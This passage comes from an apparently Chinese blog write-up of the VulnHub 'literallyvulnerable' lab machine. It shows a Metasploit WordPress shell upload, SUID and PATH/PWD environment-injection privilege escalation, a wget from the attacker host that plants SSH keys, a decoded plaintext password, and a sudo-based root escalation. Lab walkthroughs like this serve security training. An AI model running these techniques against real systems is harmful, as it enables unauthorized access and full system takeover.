+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
+<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后，没有得到预期的结果</p>
+<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
+<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
+<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
+<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
+<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
+<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
+<p>搜索 SUID 程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
+
+<p>可以运行 <code>/var/www/html/test.html</code> </p>
+<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo</code> 运行，提权成功</p>
+<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
+<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
+<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
